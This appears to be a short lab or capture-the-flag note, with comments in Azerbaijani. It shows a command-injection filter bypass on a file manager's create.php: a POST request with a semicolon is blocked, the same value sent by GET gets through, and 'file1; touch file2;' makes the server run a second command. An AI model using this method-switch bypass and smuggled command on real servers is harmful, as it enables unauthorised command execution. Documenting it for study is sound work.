# 
```powershell
POST /filemanager/create.php
filename=test;

→ "Malicious Request Denied!" ❌

GET /filemanager/create.php?filename=test;

→ Fayl yaradıldı! ✅ (filter işləmədi)


GET /filemanager/create.php?filename=file1; touch file2;
→ file1 də, file2 də yaradıldı! ✅
→ Server əmri icra etdi!
```
